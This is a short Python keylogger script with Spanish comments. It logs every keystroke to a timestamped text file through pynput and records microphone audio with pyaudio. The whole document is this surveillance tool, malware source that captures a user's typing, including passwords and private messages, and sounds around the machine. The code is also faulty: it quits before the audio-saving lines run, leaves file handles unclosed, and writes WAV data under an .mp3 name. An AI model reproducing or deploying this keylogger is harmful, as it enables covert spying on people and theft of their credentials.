from pynput.keyboard import Listener
import datetime
import time
import pyaudio 
import wave 


d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
name = 'keylogger_{}.txt'.format(d)
global t0
t0= time.time()

# --------grabación de audio

chunk = 1024  
  
sample_format = pyaudio.paInt16   
chanels = 2
  
smpl_rt = 44400  
seconds = 2
start = 0
filename = "keylogger_{}.mp3".format(d)
  
pa = pyaudio.PyAudio()   
  
stream = pa.open(format=sample_format, channels=chanels,  
                 rate=smpl_rt, input=True,  
                 frames_per_buffer=chunk) 
  
print('Recording...') 
  
frames = [] 
for i in range(0, int(smpl_rt / chunk * seconds)): 
    data = stream.read(chunk) 
    frames.append(data)
    seconds = seconds + 1

# fin de grabación de audio




# ----prueba de funcionalidades------

def key_reco(key):
    key = str(key)
    print(key)
    if key == 'Key.end':
        print("\nSaliendo del keylogger\n")
        quit()


# ------------Funcional--------------


def key_recorder(key):
    global t0
    f = open(name, "a")
    key = str(key)
    if key == 'Key.enter':
        f.write('\n')
    elif key == 'Key.space':
        f.write(' ')
    elif key == 'Key.backspace':
        f.write("%BORRAR%")
    elif key == 'Key.end':
        f.write("\nSaliendo del keylogger\n")
        f.close
        quit()
        stream.stop_stream() 
        stream.close() 
        pa.terminate() 
        print('Done !!! ') 
        sf = wave.open(filename, 'wb') 
        sf.setnchannels(chanels) 
        sf.setsampwidth(pa.get_sample_size(sample_format)) 
        sf.setframerate(smpl_rt) 
        sf.writeframes(b''.join(frames)) 
        sf.close()
    else:
        f.write(key.replace("'", ""))
    
    if time.time()-t0>60:
        t0 = time.time()
        f.write("\nguardando\n")
        f.close

with Listener(on_press=key_recorder) as l:
    l.join()
    
